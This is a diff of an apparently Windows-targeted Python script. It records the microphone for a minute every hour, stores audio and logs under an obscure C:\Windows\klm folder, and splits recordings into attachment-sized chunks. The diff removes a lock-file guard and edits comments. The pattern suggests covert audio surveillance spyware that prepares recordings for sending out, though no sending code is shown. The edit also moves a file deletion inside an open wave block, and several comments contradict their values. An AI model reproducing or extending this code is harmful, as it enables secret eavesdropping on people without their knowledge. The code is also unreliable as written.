@@ -9,22 +9,8 @@ import threading
 output_directory = "C:\\Windows\\klm\\output"
 log_directory = "C:\\Windows\\klm\\logs"
 logging.basicConfig(filename=os.path.join(log_directory, 'file_generation.log'), level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
-MICROPHONE_DURATION = 60  # 30 seconds for testing, adjust as needed
-MAX_ATTACHMENT_SIZE = 5 * 1024 * 1024  # 7 MB
-lock_path = os.path.join(log_directory, "audio_record.lock")
-
-def acquire_lock():
-    """ Acquire an exclusive lock file to prevent multiple instances. """
-    if os.path.exists(lock_path):
-        logging.error("Another instance is running.")
-        return False
-    with open(lock_path, 'w') as lock_file:
-        lock_file.write("locked")
-    return True
-
-def release_lock():
-    """ Release the exclusive lock. """
-    os.remove(lock_path)
+MICROPHONE_DURATION = 60  # Duration of recording, updated to 60 seconds
+MAX_ATTACHMENT_SIZE = 5 * 1024 * 1024  # Max size for an attachment
 
 def record_audio():
     try:
@@ -51,13 +37,12 @@ def record_audio():
             split_audio_file(audio_path)
         else:
             logging.info(f"Audio file saved to {audio_path}")
+
     except Exception as e:
         logging.error(f"Failed to record audio: {e}")
-    finally:
-        release_lock()
 
 def split_audio_file(audio_path):
-    chunk_size = MAX_ATTACHMENT_SIZE - 1024 * 1024  # 6 MB
+    chunk_size = MAX_ATTACHMENT_SIZE - 1024 * 1024  # Less than max to ensure room for more parts
     with wave.open(audio_path, 'rb') as wf:
         params = wf.getparams()
         total_frames = wf.getnframes()
@@ -71,11 +56,10 @@ def split_audio_file(audio_path):
                 frames = wf.readframes(frames_per_chunk)
                 chunk_wf.writeframes(frames)
             logging.info(f"Created audio chunk: {chunk_path} with size: {os.path.getsize(chunk_path)} bytes")
-    os.remove(audio_path)  # Delete the original file after splitting
+        os.remove(audio_path)  # Delete the original file after splitting
 
 def schedule_recording():
-    if acquire_lock():  # Only proceed if the lock was successfully acquired
-        record_audio()
+    record_audio()
     threading.Timer(3600, schedule_recording).start()  # Schedule next recording in 1 hour
 
 if __name__ == "__main__":
